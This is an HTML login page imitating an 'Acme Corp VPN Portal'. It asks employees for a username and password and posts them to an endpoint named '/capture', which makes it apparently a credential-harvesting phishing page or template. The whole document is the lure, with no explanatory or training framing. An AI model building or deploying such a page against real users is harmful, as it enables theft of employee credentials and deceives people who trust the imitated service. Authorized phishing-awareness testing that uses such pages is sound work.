<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Acme Corp VPN Portal</title>
<style>
  body { font-family: Arial, Helvetica, sans-serif; background:#f4f6f8; margin:0; }
  .card { width:380px; margin:60px auto; background:#fff; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,.12); padding:28px; }
  .logo { height:44px; margin-bottom:18px; }
  h1 { font-size:20px; color:#1f2d3d; margin:0 0 6px; }
  p.sub { color:#5a6b7b; font-size:13px; margin:0 0 18px; }
  label { display:block; font-size:13px; color:#33475b; margin:12px 0 4px; }
  input { width:100%; box-sizing:border-box; padding:9px; border:1px solid #c7d0d9; border-radius:4px; font-size:14px; }
  button { margin-top:18px; width:100%; padding:10px; background:#0b5ed7; color:#fff; border:none; border-radius:4px; font-size:15px; cursor:pointer; }
  .fine { margin-top:14px; font-size:11px; color:#8a97a3; }
</style>
</head>
<body>
  <div class="card">
    <img class="logo" src="logo.png" alt="Acme Corp">
    <h1>Acme VPN Portal</h1>
    <p class="sub">Secure remote access for Acme employees. Sign in to continue.</p>
    <form action="/capture" method="post">
      <label for="username">Username</label>
      <input id="username" name="username" type="text" autocomplete="off" placeholder="employee ID or email">
      <label for="password">Password</label>
      <input id="password" name="password" type="password" autocomplete="off" placeholder="••••••••">
      <button type="submit">Sign in</button>
    </form>
    <div class="fine">Authorized use only. All access is monitored and logged.</div>
  </div>
</body>
</html>
